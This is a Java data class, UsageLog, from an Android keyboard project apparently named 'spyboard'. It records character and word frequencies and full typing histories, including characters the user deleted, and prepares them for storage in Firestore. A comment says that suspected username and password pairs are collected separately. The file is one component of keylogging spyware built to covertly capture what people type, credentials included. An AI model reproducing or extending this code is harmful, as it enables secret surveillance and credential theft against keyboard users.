package com.idankorenisraeli.spyboard.data.types;

import android.util.Log;

import com.google.firebase.firestore.Exclude;

import java.util.HashMap;
import java.util.Map;

/**
 * Collecting typing sessions by frequencies and total histories of characters and complete words.
 * words are distinguished by a 'space' key
 * while characters can be either characters that the user started to type a word and then deleted them.
 *
 * Accounts username & password suspicious pairs are being saved outside of the logs,
 * by the @link DatabaseManager
 */
public class UsageLog {

    protected HashMap<String, Integer> wordFreq = new HashMap<>();
    protected HashMap<String, Integer> charFreq = new HashMap<>();
    //Firestore's keys are strings, therefor we will have here single character strings as key


    // Using StringBuilder and not a String for better complexity of append: O(1) instead of O(n)
    // While saving to the database just the string themselves as an output of those builders
    private @Exclude final StringBuilder charHistory = new StringBuilder();
    private @Exclude final StringBuilder wordHistory = new StringBuilder();

    public UsageLog(){
    }

    public UsageLog(HashMap<String, Integer> wordFreq, HashMap<String, Integer> charFreq) {
        this.wordFreq = wordFreq;
        this.charFreq = charFreq;
    }

    @Exclude
    public void addChar(String c){
        Integer count = charFreq.getOrDefault(c, 0);
        assert count!=null;
        count++;
        charFreq.put(c, count);
        charHistory.append(c);
    }


    @Exclude
    public void addWord(String word){
        Integer count = wordFreq.getOrDefault(word, 0);
        assert count!=null;
        count++;
        wordFreq.put(word, count);

        wordHistory.append(word).append(" ");
    }


    /**
     * This method will take an existing session and add it into this one
     * @param session a single keyboard usage with a data of a single session
     */
    public void addLog(UsageLog session){

        for(Map.Entry<String, Integer> entry : session.getWordFreq().entrySet()) {
            Integer sessionSum = session.getWordFreq().getOrDefault(entry.getKey(), 0);

            //Merging the entries of the new session into the word freq
            if(sessionSum!=null)
                wordFreq.merge(entry.getKey(), entry.getValue(), Integer::sum);

        }

        for(String key : session.getCharFreq().keySet()) {
            Integer sessionSum = session.getCharFreq().getOrDefault(key, 0);
            if(sessionSum!=null)
                charFreq.merge(key, sessionSum, Integer::sum);

        }

        this.charHistory.append(session.getCharHistory());
        this.wordHistory.append(session.getWordHistory());

    }


    public HashMap<String, Integer> getWordFreq() {
        return wordFreq;
    }

    public void setWordFreq(HashMap<String, Integer> wordFreq) {
        this.wordFreq = wordFreq;
    }

    public HashMap<String, Integer> getCharFreq() {
        return charFreq;
    }

    public void setCharFreq(HashMap<String, Integer> charFreq) {
        this.charFreq = charFreq;
    }

    public String getCharHistory() {
        return charHistory.toString();
    }


    public String getWordHistory() {
        return wordHistory.toString();
    }

}

